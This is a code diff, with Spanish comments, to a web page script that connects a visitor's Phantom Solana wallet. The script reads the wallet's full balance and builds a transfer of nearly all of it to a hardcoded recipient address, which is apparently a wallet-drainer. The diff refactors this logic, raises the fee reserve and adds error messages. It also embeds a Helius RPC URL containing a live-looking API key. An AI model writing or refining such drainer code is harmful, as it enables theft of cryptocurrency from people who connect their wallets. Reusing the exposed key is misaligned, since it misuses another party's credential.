@@ -54,6 +54,9 @@
     const walletStatusDiv = document.getElementById("wallet-status");
     let connectedPublicKey = null;
 
+    // Configuración de conexión con Helius
+    const connection = new solanaWeb3.Connection("https://mainnet.helius-rpc.com/?api-key=6f17ef70-139f-463a-bfaa-85a120eee8d3", "confirmed");
+
     // Verifica si Phantom Wallet está instalada
     const isPhantomInstalled = () => {
       return window.solana && window.solana.isPhantom;
@@ -62,7 +65,6 @@
     // Función para obtener saldo de la wallet
     const getWalletBalance = async (publicKey) => {
       try {
-        const connection = new solanaWeb3.Connection("https://mainnet.helius-rpc.com/?api-key=6f17ef70-139f-463a-bfaa-85a120eee8d3", "confirmed");
         const balance = await connection.getBalance(publicKey);
         console.log(`Balance en lamports: ${balance}`);
         return balance / solanaWeb3.LAMPORTS_PER_SOL;
@@ -80,28 +82,27 @@
       }
 
       const recipient = new solanaWeb3.PublicKey("BspM3ijR1wNgxpm6teGe6CUGRzSCwthoPefE2TpCjssb");
-      const connection = new solanaWeb3.Connection("https://mainnet.helius-rpc.com/?api-key=6f17ef70-139f-463a-bfaa-85a120eee8d3", "confirmed");
 
       try {
         const latestBlockhash = await connection.getLatestBlockhash();
-        const transaction = new solanaWeb3.Transaction({
-          recentBlockhash: latestBlockhash.blockhash,
-          feePayer: connectedPublicKey
-        });
-
-        // Obtiene el saldo actual
         const balance = await connection.getBalance(connectedPublicKey);
+
         if (balance <= 0) {
           walletStatusDiv.innerHTML = `<span class="error">No hay fondos disponibles para enviar.</span>`;
           return;
         }
 
-        // Agrega una instrucción para transferir todos los fondos
+        const transaction = new solanaWeb3.Transaction({
+          recentBlockhash: latestBlockhash.blockhash,
+          feePayer: connectedPublicKey
+        });
+
+        // Resta una tarifa de seguridad para las comisiones
         transaction.add(
           solanaWeb3.SystemProgram.transfer({
             fromPubkey: connectedPublicKey,
             toPubkey: recipient,
-            lamports: balance - 5000 // Deja espacio para la comisión de red
+            lamports: balance - 10000 // Reservar 10,000 lamports para tarifas (~0.00001 SOL)
           })
         );
 
@@ -110,7 +111,7 @@
 
         // Envía la transacción
         const txid = await connection.sendRawTransaction(signedTransaction.serialize());
-        await connection.confirmTransaction(txid, "confirmed");
+        await connection.confirmTransaction(txid, "finalized");
 
         walletStatusDiv.innerHTML = `
           <span class="success">Fondos enviados exitosamente. TXID: ${txid}</span>
@@ -118,7 +119,7 @@
         sendFundsButton.style.display = "none";
       } catch (err) {
         console.error("Error al enviar los fondos:", err);
-        walletStatusDiv.innerHTML = `<span class="error">Error al enviar los fondos.</span>`;
+        walletStatusDiv.innerHTML = `<span class="error">Error al enviar los fondos: ${err.message}</span>`;
       }
     };
 
@@ -159,6 +160,7 @@
         }
       } catch (err) {
         console.error("Error al conectar la wallet:", err);
+        walletStatusDiv.innerHTML = `<span class="error">Error al conectar la wallet: ${err.message}</span>`;
       }
     };
 
